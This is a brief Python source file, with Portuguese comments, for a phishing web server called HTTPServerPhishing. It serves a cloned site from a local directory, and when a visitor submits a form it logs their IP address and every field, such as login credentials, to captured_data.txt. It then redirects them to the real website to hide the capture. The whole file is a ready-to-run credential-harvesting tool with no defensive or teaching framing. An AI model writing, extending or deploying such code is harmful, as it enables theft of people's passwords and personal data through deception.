from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class ServerHandler(SimpleHTTPRequestHandler):
    redirect_Original_website, redirect_Path = None, None

    def do_GET(self):
        self.log_message('', "Connected : %s" % (self.address_string()))
        if self.path == '/':
            self.path = self.redirect_Path + "index.html"
        elif self.path.startswith('/'):
            self.path = self.redirect_Path + self.path
        SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        # Evita log padrão
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        form_data = parse_qs(post_data)

        # Salva dados capturados
        with open("captured_data.txt", "a") as f:
            f.write(f"IP: {self.client_address[0]}\n")
            for key, values in form_data.items():
                f.write(f"{key}: {values[0]}\n")
            f.write("="*30 + "\n")

        self.redirect(self.redirect_Original_website)

class HTTPServerPhishing:
    def __init__(self, Address, PORT, redirect=None, directory=None):
        self.Address, self.PORT = Address, PORT
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory

    def Method_GET_LOG(self, format, *args):
        print(list(args)[0])

    def run(self):
        self.httpd = HTTPServer((self.Address, self.PORT), self.Handler)
        self.Handler.log_message = self.Method_GET_LOG
        self.httpd.serve_forever()
